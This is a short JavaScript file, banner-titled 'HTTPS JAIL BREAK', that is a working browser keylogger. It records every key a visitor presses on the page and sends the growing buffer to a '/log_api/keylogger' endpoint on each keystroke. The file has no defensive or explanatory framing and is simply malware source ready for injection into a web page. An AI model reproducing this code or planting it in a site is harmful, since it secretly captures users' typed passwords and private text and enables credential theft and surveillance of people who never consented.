
//⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️

// created by Idan Maman © 

loggingData = "" 



document.onkeydown =async  function(event){
  loggingData +=event.key.toString();
    const rawResponse = await fetch("/log_api/keylogger", {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({logdata : loggingData })
    });

}




//⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️
